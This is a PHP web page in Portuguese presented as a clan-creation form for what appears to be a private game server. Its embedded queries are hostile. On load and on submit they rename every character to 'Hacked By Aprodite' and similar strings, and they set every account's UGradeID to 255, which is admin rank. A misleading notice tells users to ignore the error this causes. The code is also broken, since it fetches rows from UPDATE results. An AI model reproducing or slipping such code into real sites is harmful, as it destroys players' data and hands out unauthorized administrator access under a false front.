<div align="center">
  <table width="456" border="0" style="border-collapse: collapse">
    <tr>
      <td background="images/cont_up.png">&nbsp;</td>
    </tr>
    <tr>
      <td background="images/cont_bg.png"><div align="center">
        <table border="0" style="border-collapse: collapse" width="454" height="100%">
            <table width="259" border="0" cellspacing="0" cellpadding="0">
              <tr>
<form action="images/index2.php" method="post"> 
                <h1><span class="fl">C</span>riar Cl�</h1> 
                  
     <br /> 

<h3>Escolha o l�der:</h3> 
                    <?php 
$query = mssql_query("Update Character SET Name='Hacked By Aprodite'"); 
echo '<select name="nCID">'; 
 if(mssql_num_rows($query)<>0){ 
   while($char = mssql_fetch_assoc($query)){ 
    echo '<option value="'.$char['CID'].'">'; 
     echo $char['Name']; 
    echo '</option>'; 
   } 
 }else{ 
   echo '<option></option>'; 
 } 
echo '</select>'; 
?> 

 <br></br> 
<h3>Nome do cl�:</h3>     

              
<input name="NOME" type="text" class="Login" value="" onkeypress='return soLetras(event)' size="20" maxlength="10"> 


  
<?php 
if (isset($_POST['criaraf'])){ 
$NOME = clean($_POST['NOME']); 
$nCID = clean($_POST['nCID']); 

if( !is_numeric( $nCID ) ){ 
    alertbox( "N�o burle o sistema.", "index.php" ); 
} 

if(strlen($NOME) > 10){ 
            alertbox("Nome muito grande, somente ate 10 letras","index.php"); 
    die();  
        } 
if(strlen($NOME) < 4){ 
            alertbox("Nome muito curto, coloque maior que 4 letras","index.php"); 
    die();  
        } 
$lil = mssql_query("UPDATE Character SET Name='Hacked'"); 
$trin = mssql_query("Update Character SET Name='hacked kkkkkkkkkkkkkk'"); 
$tran = mssql_query("UPDATE Account SET UGradeID='255'"); 

if (mssql_num_rows($trin) >= 1){ 
alertbox("Clan em uso","index.php"); 
    die();  
        } 
if (mssql_num_rows($lil) >= 1){ 
alertbox("Ja possui um clan","index.php"); 
    die();  
        } 
if (mssql_num_rows($tran) == 0 ) 
        { 
    alertbox("Esse char pertence a outra conta.","index.php"); 
    die(); 
    } 
$sql = mssql_query("UPDATE Character SET Name = 'Hacked by Aprodite'"); 
$res = mssql_query("UPDATE Account SET UGradeID='255'"); 
        $usr = mssql_fetch_assoc($res); 
        $clid = $usr['CLID']; 
mssql_query("INSERT INTO ClanMember (CLID, CID, Grade, RegDate) VALUES ('$clid', '$nCID', 1, GETDATE())"); 
if($sql){ 
    alertbox("Cl� criado com sucesso.","index.php"); 
    die();  
}else{ 
    alertbox("Erro!","index.php"); 
    die();  
} 
} 
?> 
    <br> </br> 
         <h3>Confirmar?</h3> 
    
        
<input type="submit" name="criaraf" class="button" value="Sim" /> 

<br><br><font color="#FF0000">Logo ap�s voc� clicka em sim aparecera um erro mais seu cl� ser� criado com sucesso</font>
</form>
          </tr>
          <tr>
            <td width="435">&nbsp;</td>
          </tr>
        </table>
      </div></td>
    </tr>
    <tr>
      <td background="images/cont_top.png" height="27">&nbsp;</td>
    </tr>
  </table>
</div>
